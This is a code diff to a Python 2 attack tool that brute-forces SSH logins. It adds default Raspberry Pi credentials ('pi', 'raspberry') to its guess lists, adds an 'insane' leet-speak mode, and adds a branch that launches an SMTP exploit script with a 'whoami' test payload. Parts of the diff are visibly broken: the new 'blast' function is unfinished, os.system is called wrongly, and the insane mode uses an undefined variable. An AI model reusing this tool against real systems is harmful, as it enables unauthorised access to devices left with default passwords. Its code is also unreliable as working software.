@@ -122,10 +122,10 @@ def attempt(ip,uname,passwd):
 def hack_back(ip, determination):
     p = multiprocessing.Pool(processes=4)
     success = {}
-    names = ['root']    # 'user','sys', 'admin',
+    names = ['root', 'admin', 'pi']    # 'user','sys', 'admin',
     start = time.time()
     connected = False
-    common = ['admin', 'default', 'password', 'password123', 'toor', 'root']
+    common = ['admin', 'default', 'password', 'password123', 'toor', 'root', 'raspberry']
     additional_words = list(set(swap('common_passwords.txt', False)))
     random.shuffle(additional_words)
     if not determination[0]:
@@ -162,6 +162,14 @@ def hack_back(ip, determination):
     return connected, success
 
 
+def blast(ip):
+    p = multiprocessing.Pool(processes=5)
+    success = {}
+    names = ['root','pi', 'admin']
+    start = time.time()
+    connected = False
+
+
 def blunt_force_attack(address, strong):
     pwns = {}
     bruted = False
@@ -182,10 +190,18 @@ def blunt_force_attack(address, strong):
                     print '[*] %d is Open' % port
                     if port == 22:  # SSH
                         t0 = time.time()
-                        bruted, credentials = hack_back(address, strong)
+                        if type(strong[0])==bool:
+                            bruted, credentials = hack_back(address, strong)
+                        elif strong[0]=='insane':
+                            print '[**] \t\033[1mRUNNING INSANE MODE\033[0m[**]'
+                            bruted, credentials = blast(addr)
                         if bruted:
                             pwns[address] = credentials
                             print '!! Bruteforcecd in %s second' % str(time.time()-t0)
+                    if port == 25:  # SMTP
+                        t0 = time.time()
+                        test_payload = 'whoami'
+                        os.system('python smtpwn.py %s %s %s', (address,25,test_payload))
                 except IndexError:
                     pass
 
@@ -266,3 +282,9 @@ if __name__ == '__main__':
         addr = sys.argv[2]
         size = int(sys.argv[4])
         blunt_force_attack(addr, [False, size])
+
+    elif 'hit' in sys.argv and '-insane' in sys.argv:
+        addr = sys.argv[2]
+        # DO Actually crazy permutations of leet-speak on dictionary
+        blunt_force_attack(addr, ['insane'])
+
